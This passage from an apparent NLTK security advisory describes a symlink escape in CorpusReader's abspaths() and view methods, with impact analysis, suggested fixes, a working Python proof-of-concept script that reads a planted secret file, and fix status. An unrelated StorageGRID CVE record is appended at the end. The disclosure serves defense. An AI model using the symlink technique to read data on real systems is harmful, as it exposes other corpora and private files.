nltk version: 3.9.4/3.10.3   python: 3.10.12   (posix)
CONTROL open() rejects symlink escape                 ValueError: ... escapes root ...
abspaths() pointer.open() reads outside root          b'TOPSECRET\n'
PlaintextCorpusReader.words() leaks outside root      ['TOPSECRET']
SyntaxCorpusReader.words() leaks outside root         ['TOPSECRET']
GLOBAL sandbox still blocks outside-allowed-root read PermissionError: ... Unauthorized path ...
                                                      (3.10.3+ only; on 3.9.4 the sandbox
                                                       is not enforced and the read succeeds)
RESULT: 3.9.4: 8/9 · 3.10.3: 9/9 · master: 9/9 (all scoped-escape checks pass)
```

The scoped-escape checks (the vulnerability itself) pass on all three pinned versions; the single 3.9.4 difference is the global-sandbox boundary check, which is weaker there by design (`ENFORCE=False`, thin `pathsec.open`).

### Impact

- **Type**: CWE-59 improper link resolution before file access (with CWE-22 traversal flavor). A local principal who can place an intermediate-directory symlink inside an NLTK corpus root — e.g. a user with any account that loads NLTK corpora, or the supplier of an untrusted corpus in a supply-chain/web-service loading model — can read the *contents* of any file that lies inside a global NLTK allowed root but outside the corpus root.
- **Who is impacted**: any deployment where a trusted application loads NLTK corpus data that is or contains attacker-influenced directory symlinks: shared/multi-tenant pipelines, notebooks, services that extract downloaded corpora (via `tar`/`git`/app logic) into `~/nltk_data`/`nltk.data.path` roots, and CI systems. The scoped guard was added specifically so that "corpus root + in-root symlink" cannot read outside the root even when the target stays inside the global sandbox.
- **Attacker requirements**: a directory symlink must *physically exist* inside a corpus root on the target machine, pointing at another NLTK allowed root; the fileids passed to a view method must traverse it (`fileids` is caller-controlled on every affected view method). The attacker therefore needs local filesystem influence to place the symlink — direct write access to the data root, or supply of an untrusted corpus that is unpacked in a symlink-preserving way (manual `tar` extraction, `git` checkout, shared/multi-tenant data directory, or app-specific unpacking logic). Note that NLTK's own `downloader` only handles `.zip`, and Python `zipfile` extraction does **not** preserve symlinks (a symlink member is written as a plain file), so a bare "upload a zip" delivery does not by itself place the symlink. This is why the vector is scored `AV:L/PR:L` rather than `AV:N/PR:N`: the read is a local file access and the triggering symlink must already be on the local filesystem. In deployments where a symlink-preserving remote corpus feed feeds the data directory automatically, an attacker could achieve the same effect with no local account; that scenario is covered here under "who is impacted" rather than as a stronger default score.
- **Effect**: cross-corpus / cross-data disclosure of file contents within the global NLTK data sandbox (e.g. reading one corpus through another, or reading private data staged under an allowed root). The global sandbox still confines reads to allowed roots; this does **not** reach `/etc/passwd` or arbitrary paths outside the sandbox.

**Suggested fix**: make the scoped check the single shared behavior of the corpus file-access surface instead of an `open()`-only special case:

1. In `CorpusReader.abspath()`/`abspaths()` (`api.py:174-217`), run `pathsec.validate_path(self._root.join(f), context="CorpusReader", required_root=self._root)` for every `f` before returning the pointer — this is the same Layer-2 check `open()` performs at `api.py:246-249`, so both channels reject a symlink-resolved escape identically.
2. Alternatively (or additionally), thread `required_root` through the pointer: have `CorpusReader` attach its root to the `FileSystemPathPointer` (or have `StreamBackedCorpusView._open()` in `util.py:203-216` pass a scoped root), so `pathsec.open`/`_hardened_open` validate the opened fd's realpath against the corpus root — closing the same gap for any future caller that opens pointers.
3. Add regression coverage mirroring `test_required_root_blocks_symlink_escape` for the view-method channel: a corpus root inside a global allowed root, an intermediate directory symlink to an out-of-root sibling, explicit `fileids=["sub/secret.txt"]`, and an assertion that `reader.words(fileids=[...])` (and `sents`/`abspaths().open()`) raise `ValueError`/`PermissionError` exactly as `reader.open(...)` does.

### Reproduction script (self-contained)

```bash
# Self-checking, control-grouped reproduction script embedded in this advisory.
# Usage: python3 - <<'EOF' ... EOF   (requires: pip install nltk)
# A private temp sandbox is created at runtime and registered via nltk.data.path.

#!/usr/bin/env python3
"""Self-checking reproduction of CorpusReader view-method scoped-sandbox bypass.

The affected surfaces are:
  - CorpusReader.abspaths()/abspath() return a FileSystemPathPointer without the
    required_root scoped check that CorpusReader.open() applies (api.py:235-257);
    PlaintextCorpusReader view methods open those pointers directly.
  - SyntaxCorpusReader view methods (words/sents/parsed_sents/tagged_words/
    tagged_sents) also open via abspaths() without the scoped check.

Control group: the SAME fileid through reader.open() is rejected by the Layer-2
scoped guard (validate_path(..., required_root=self._root)).

Environment: base sandbox dir is a private temp dir appended to nltk.data.path
(the attacker-controlled corpus root lives inside an allowed NLTK data root).
"""

import os
import shutil
import sys
import tempfile

import nltk
import nltk.data

PASS = 0
FAIL = 0


def check(name, cond, detail=""):
    global PASS, FAIL
    if cond:
        PASS += 1
        print(f"PASS  {name}  {detail}")
    else:
        FAIL += 1
        print(f"FAIL  {name}  {detail}")


def main():
    print(f"nltk version: {nltk.__version__}   python: {sys.version.split()[0]}")
    import nltk.pathsec as ps

    print(f"pathsec.ENFORCE = {ps.ENFORCE}   posix = {os.name == 'posix'}")

    base = tempfile.mkdtemp(prefix="nltk_sandbox_")
    os.chmod(base, 0o700)
    nltk.data.path.append(base)  # make the private sandbox an allowed NLTK data root

    rootA = os.path.join(base, "corpora", "mysample")   # corpus root R
    rootB = os.path.join(base, "bar")                   # sibling, inside allowed root
    os.makedirs(rootA)
    os.makedirs(rootB)

    secret = "TOPSECRET"
    with open(os.path.join(rootB, "secret.txt"), "w") as f:
        f.write(secret + "\n")

    # Bracket-parse file is read as sexpr blocks by BracketParseCorpusReader
    with open(os.path.join(rootB, "bracket.txt"), "w") as f:
        f.write("(S (NP TOPSECRET))\n")

    # Intermediate-directory symlink inside the corpus root -> sibling outside R
    linkdir = os.path.join(rootA, "sub")
    os.symlink(rootB, linkdir)

    check("sandbox is an allowed root", base in {str(p) for p in ps._get_allowed_roots()})
    check("symlink created", os.path.islink(linkdir))

    # ---------------------------------------------------------------- control
    from nltk.corpus.reader.plaintext import PlaintextCorpusReader

    reader = PlaintextCorpusReader(rootA, r".*")
    try:
        reader.open("sub/secret.txt")
        check("CONTROL open() rejects symlink escape", False, "no exception raised")
    except ValueError as e:
        check("CONTROL open() rejects symlink escape", True, f"ValueError: {str(e)[:60]}")
    except PermissionError as e:
        check("CONTROL open() rejects symlink escape", True, f"PermissionError: {str(e)[:60]}")
    except Exception as e:
        check("CONTROL open() rejects symlink escape", True, f"{type(e).__name__}: {str(e)[:60]}")

    # ------------------------------------------------- abspaths() pointer
    ptr = reader.abspaths(["sub/secret.txt"])[0]
    try:
        content = ptr.open().read()
        check("abspaths() pointer.open() reads outside root", content == (secret + "\n").encode(), f"got {content!r}")
    except Exception as e:
        check("abspaths() pointer.open() reads outside root", False, f"{type(e).__name__}: {str(e)[:60]}")

    # ------------------------------------------------- PlaintextReader.words()
    try:
        words = list(reader.words(["sub/secret.txt"]))
        check("PlaintextCorpusReader.words() leaks outside root", any(secret in w for w in words), f"words={words}")
    except Exception as e:
        check("PlaintextCorpusReader.words() leaks outside root", False, f"{type(e).__name__}: {str(e)[:60]}")

    # ------------------------------------------------------------ syntax views
    from nltk.corpus.reader.bracket_parse import BracketParseCorpusReader

    brow = BracketParseCorpusReader(rootA, r".*")
    try:
        # control on the syntax reader open()
        brow.open("sub/bracket.txt")
        check("CONTROL syntax reader open() rejects symlink escape", False, "no exception raised")
    except Exception as e:
        check("CONTROL syntax reader open() rejects symlink escape", True, f"{type(e).__name__}: {str(e)[:60]}")

    try:
        sent = list(brow.words(["sub/bracket.txt"]))
        check("SyntaxCorpusReader.words() leaks outside root", any(secret in w for w in sent), f"words={sent}")
    except Exception as e:
        check("SyntaxCorpusReader.words() leaks outside root", False, f"{type(e).__name__}: {str(e)[:60]}")

    try:
        sents = list(brow.sents(["sub/bracket.txt"]))
        check("SyntaxCorpusReader.sents() leaks outside root", any(secret in w for w in sents), f"sents={sents}")
    except Exception as e:
        check("SyntaxCorpusReader.sents() leaks outside root", False, f"{type(e).__name__}: {str(e)[:60]}")

    # ----------------------------------------------------------- global-sandbox boundary
    # The escape is bounded: a file OUTSIDE every allowed root must still be refused.
    outside = os.path.join(base, "..", "etc")
    os.makedirs(outside, exist_ok=True)
    outfile = os.path.join(outside, "secret.txt")
    with open(outfile, "w") as f:
        f.write("OUTSIDE\n")
    # point a second symlink inside rootA to a directory outside all allowed roots
    linkout = os.path.join(rootA, "out")
    os.symlink(outside, linkout)
    try:
        got = reader.abspaths(["out/secret.txt"])[0].open().read()
        check("GLOBAL sandbox still blocks outside-allowed-root read", False, f"leaked {got!r}")
    except Exception as e:
        check("GLOBAL sandbox still blocks outside-allowed-root read", True, f"{type(e).__name__}: {str(e)[:60]}")

    print(f"\nRESULT: {PASS} passed, {FAIL} failed")
    shutil.rmtree(base, ignore_errors=True)
    return 0 if FAIL == 0 else 1


if __name__ == "__main__":
    sys.exit(main())
```


## Fix status (2026-09-28)

Status: MERGED on develop (unreleased; v3.10.3 of 2026-08-12 predates the fix).

PR: #3761 "Contain CorpusReader / agreement / chat80 file I/O in the pathsec sandbox", merged 2026-08-17, merge commit cd4953f7b on develop. Fix commit: 9f7cf06b4 (the corpus-reader path pointers and view methods resolve and validate against the reader's root, so an intermediate directory symlink that leaves the root is refused).

Probe: none. The advisory PoC re-run (a corpus root R with R/sub pointing at a sibling directory inside the same data root, then abspaths()[0].open(), words() and open() on sub/secret.txt): on develop 2fa3f48fe all three are refused with ValueError (security violation, path escapes root); on v3.10.3 and on 6818767b9 abspaths().open() and words() return the secret while open() is refused, which matches the advisory. A bisect of develop between 6818767b9 and 2fa3f48fe with that reproduction names 9f7cf06b4 as the first fixed commit.

Release: none yet; no release tag contains 9f7cf06b4.

cna.title: CVE-2026-22062 Information Exposure Vulnerability in StorageGRID (formerly StorageGRID Webscale)

descriptions.value: StorageGRID (formerly StorageGRID Webscale) versions 12.1.0 and higher are susceptible to an information exposure vulnerability which allows a remote unauthenticated attacker to acquire low-sensitivity credentials via a Man-in-the-middle attack when certain non-default features are enabled.
